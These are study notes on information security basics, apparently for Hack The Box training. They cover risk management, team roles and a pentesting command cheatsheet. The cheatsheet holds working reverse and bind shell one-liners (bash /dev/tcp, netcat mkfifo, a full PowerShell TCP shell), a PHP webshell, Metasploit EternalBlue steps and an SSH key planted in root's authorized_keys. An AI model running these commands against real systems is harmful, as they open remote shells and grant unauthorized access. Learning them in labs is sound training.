# Information Security Overview Summary

Information Security (Infosec) protects data from unauthorized access, changes, unlawful use, or disruption. Encompasses specializations like network/infrastructure security, application security, security testing, systems auditing, business continuity, digital forensics, incident response. Core: Maintain CIA triad (Confidentiality, Integrity, Availability) of data (electronic/physical, tangible/intangible).

## Risk Management Process

5-step process for effective data protection without hindering operations:

1. **Identifying the Risk**: Spot exposures (legal, environmental, market, regulatory).
2. **Analyze the Risk**: Assess impact/probability; map to policies/procedures.
3. **Evaluate the Risk**: Rank/prioritize; decide to accept, avoid, control, or transfer.
4. **Dealing with Risk**: Eliminate/contain via stakeholder interface.
5. **Monitoring Risk**: Continuously monitor for changes in impact.

Focus on information assurance against incidents (disasters, malfunctions, breaches).

## Red Team vs. Blue Team

- **Red Team**: Offensive; simulates attackers (pentesting, social engineering) to find weaknesses.
- **Blue Team**: Defensive; majority of infosec jobs; analyzes risks, creates policies, responds to threats, uses tools.

## Role of Penetration Testers

Identify risks in networks/apps (vulns, misconfigs, data exposure). Assessments: White-box (full info), phishing, red team scenarios. Understand risks/environment for accurate vuln rating. Deep risk management knowledge essential.

**Additional**: Pentesters provide reproduction steps, mitigation guidance. Skills apply to any environment, not just HTB.

## Cheatsheet

Essential commands/tools for getting started. (Keep as reference; practice on HTB.)

### Basic Tools

- **General**:
  - `sudo openvpn user.ovpn`: Connect to VPN.
  - `ifconfig` or `ip a`: Show IP.
  - `netstat -rn`: Show accessible networks.
  - `ssh user@10.10.10.10`: SSH to server.
  - `ftp 10.129.42.253`: FTP to server.
- **Tmux**:
  - `tmux`: Start tmux.
  - `ctrl+b`: Prefix.
  - `prefix c`: New window.
  - `prefix 1`: Switch to window 1.
  - `prefix shift+%`: Split vertically.
  - `prefix shift+"`: Split horizontally.
  - `prefix ->`: Switch right pane.
- **Vim**:
  - `vim file`: Open file.
  - `esc+i`: Insert mode.
  - `esc`: Normal mode.
  - `x`: Cut char.
  - `dw`: Cut word.
  - `dd`: Cut line.
  - `yw`: Copy word.
  - `yy`: Copy line.
  - `p`: Paste.
  - `:1`: Go to line 1.
  - `:w`: Save.
  - `:q`: Quit.
  - `:q!`: Quit no save.
  - `:wq`: Save and quit.

### Pentesting

- **Service Scanning**:
  - `nmap 10.129.42.253`: Basic Nmap.
  - `nmap -sV -sC -p- 10.129.42.253`: Script scan.
  - `locate scripts/citrix`: List Nmap scripts.
  - `nmap --script smb-os-discovery.nse -p445 10.10.10.40`: Run script.
  - `netcat 10.10.10.10 22`: Banner grab.
  - `smbclient -N -L \\\\10.129.42.253`: List SMB shares.
  - `smbclient \\\\10.129.42.253\\users`: Connect to share.
  - `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`: SNMP scan.
  - `onesixtyone -c dict.txt 10.129.42.254`: Brute SNMP.
- **Web Enumeration**:
  - `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`: Dir scan.
  - `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`: Subdomain scan.
  - `curl -IL https://www.inlanefreight.com`: Banner grab.
  - `whatweb 10.10.10.121`: Web details.
  - `curl 10.10.10.121/robots.txt`: Robots.txt.
  - `ctrl+U`: View source (Firefox).
- **Public Exploits**:
  - `searchsploit openssh 7.2`: Search exploits.
  - `msfconsole`: Start Metasploit.
  - `search exploit eternalblue`: Search in MSF.
  - `use exploit/windows/smb/ms17_010_psexec`: Use module.
  - `show options`: Show options.
  - `set RHOSTS 10.10.10.40`: Set target.
  - `check`: Test vuln.
  - `exploit`: Run exploit.
- **Using Shells**:
  - `nc -lvnp 1234`: Start listener.
  - `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`: Reverse shell.
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`: Another reverse.
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`: Bind shell.
  - `nc 10.10.10.1 1234`: Connect to bind.
  - `python -c 'import pty; pty.spawn("/bin/bash")'`: Upgrade TTY (1).
  - `ctrl+z then stty raw -echo then fg then enter twice`: Upgrade TTY (2).
  - `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`: Create webshell.
  - `curl http://SERVER_IP:PORT/shell.php?cmd=id`: Execute on webshell.
- **Privilege Escalation**:
  - `./linpeas.sh`: Run LinPEAS.
  - `sudo -l`: List sudo privs.
  - `sudo -u user /bin/echo Hello World!`: Run with sudo.
  - `sudo su -`: Switch to root.
  - `sudo su user -`: Switch to user.
  - `ssh-keygen -f key`: Generate SSH key.
  - `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`: Add public key.
  - `ssh root@10.10.10.10 -i key`: SSH with key.
- **Transferring Files**:
  - `python3 -m http.server 8000`: Start webserver.
  - `wget http://10.10.14.1:8000/linpeas.sh`: Download file.

**Additional Tools/Commands**: For VPN: Use OpenVPN configs from HTB. For shells: PowerShell reverse 

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"`

Practice on HTB for hands-on. For priv esc: WinPEAS on Windows. Always use tmux for sessions.